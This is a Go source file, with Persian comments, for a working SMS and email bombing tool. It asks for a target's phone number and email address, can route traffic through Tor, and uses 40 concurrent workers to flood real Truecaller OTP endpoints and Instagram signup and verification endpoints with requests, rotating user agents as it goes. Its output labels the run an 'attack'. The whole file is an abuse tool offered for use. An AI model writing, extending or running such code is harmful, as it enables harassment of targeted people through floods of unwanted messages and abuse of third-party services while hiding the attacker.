package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/proxy" // <-- بخش جدید: پکیج برای استفاده از پروکسی Tor
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
}

// ... توابع کمکی (clearScreen, sendRequest, etc) ...

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	if url == "" {
		ch <- -1
		return
	}
	jsonData, _ := json.Marshal(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		ch <- -1
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	resp, err := client.Do(req)
	if err != nil {
		ch <- http.StatusInternalServerError
		return
	}
	ch <- resp.StatusCode
	resp.Body.Close()
}

func sendFormRequest(client *http.Client, ctx context.Context, urlStr string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	if urlStr == "" {
		ch <- -1
		return
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, urlStr, strings.NewReader(formData.Encode()))
	if err != nil {
		ch <- -1
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	resp, err := client.Do(req)
	if err != nil {
		ch <- http.StatusInternalServerError
		return
	}
	ch <- resp.StatusCode
	resp.Body.Close()
}

func parsePhoneNumber(fullNumber string) (string, string) {
	if !strings.HasPrefix(fullNumber, "+") {
		return "", ""
	}
	numericToAlpha := map[string]string{
		"32": "be",
		"98": "ir",
		"1":  "us", // اصلاح شده: کاراکتر نامرئی حذف شد
		"44": "gb",
	}
	for numCode, alphaCode := range numericToAlpha {
		if strings.HasPrefix(fullNumber, "+"+numCode) {
			phonePart := strings.TrimPrefix(fullNumber, "+")
			return phonePart, alphaCode
		}
	}
	return "", ""
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clearScreen()
	fmt.Println("... Your ASCII Art Banner ...")

	var phone, email string
	fmt.Print("\033[01;32mEnter target phone with country code (e.g., +98912...): \033[00;36m")
	fmt.Scan(&phone)

	fmt.Print("\033[01;32mEnter target email (e.g., target@domain.com): \033[00;36m")
	fmt.Scan(&email)

	var repeatCount int
	fmt.Print("\033[01;32mEnter number of attacks per service: \033[00;36m")
	fmt.Scan(&repeatCount)

	// =========================================================================
	// بخش جدید: انتخاب برای استفاده از Tor
	// =========================================================================
	var useTor string
	fmt.Print("\033[01;33mDo you want to use Tor? (yes/no): \033[00;36m")
	fmt.Scan(&useTor)

	// ساخت http.Client
	// اگر کاربر انتخاب کند، از پروکسی Tor استفاده می‌کنیم
	client := &http.Client{Timeout: 30 * time.Second} // افزایش زمان برای شبکه Tor

	if strings.ToLower(useTor) == "yes" {
		fmt.Println("\033[01;32m[*] Configuring to use Tor proxy on 127.0.0.1:9050...")
		
		// آدرس پروکسی Tor
		torProxy := "127.0.0.1:9050"

		// ایجاد یک dialer که از پروکسی SOCKS5 استفاده می‌کند
		dialer, err := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
		if err != nil {
			fmt.Println("\033[01;31m[-] Error creating Tor dialer:", err)
			os.Exit(1)
		}

		// تنظیم transport برای http.Client
		httpTransport := &http.Transport{
			DialContext: dialer.(proxy.ContextDialer).DialContext,
		}
		client.Transport = httpTransport
	}

	numWorkers := 40

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-signalChan; cancel() }()

	tasks := make(chan func(), repeatCount*200)
	ch := make(chan int, repeatCount*200)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		if phone != "" {
			// ** API 1: Truecaller (EU) **
			wg.Add(1)
			tasks <- func() {
				phoneNum, countryCode := parsePhoneNumber(phone)
				if phoneNum != "" && countryCode != "" {
					payload := map[string]interface{}{
						"phone":       phoneNum, // اصلاح شده: کاراکتر نامرئی حذف شد
						"countryCode": countryCode,
					}
					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", payload, &wg, ch)
				} else {
					wg.Done()
				}
			}

			// ** API 1.5: Truecaller (Non-EU) **
			wg.Add(1)
			tasks <- func() {
				phoneNum, countryCode := parsePhoneNumber(phone)
				if phoneNum != "" && countryCode != "" {
					payload := map[string]interface{}{
						"phone":       phoneNum,
						"countryCode": countryCode,
					}
					sendJSONRequest(client, ctx, "https://asia-south1-truecaller-web.cloudfunctions.net/webapi/noneu/auth/truecaller/v1/send-otp", payload, &wg, ch)
				} else {
					wg.Done()
				}
			}

			// ** API 2 & 3: Instagram **
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("phone_number", phone)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/", formData, &wg, ch)
			}
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("client_id", "some_generated_client_id")
				formData.Set("phone_number", phone)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/send_signup_sms_code_ajax/", formData, &wg, ch)
			}
		}

		if email != "" {
			// ** API 4 & 5: Instagram **
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("email", email)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_email/", formData, &wg, ch)
			}
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("device_id", "some_generated_device_id")
				formData.Set("email", email)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/accounts/send_verify_email/", formData, &wg, ch)
			}
		}
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	fmt.Println("\n[*] Starting attack... Press Ctrl+C to stop.")
	successCount, failCount := 0, 0
	for statusCode := range ch {
		if statusCode >= 200 && statusCode < 300 {
			fmt.Println("\033[01;32m[+] Request Succeeded")
			successCount++
		} else if statusCode > 0 {
			fmt.Printf("\033[01;31m[-] Request Failed with status: %d\n", statusCode)
			failCount++
		}
	}
	fmt.Printf("\n\033[01;34m[*] Attack finished. Success: %d, Failed/Canceled: %d\n\033[0m", successCount, failCount)
}
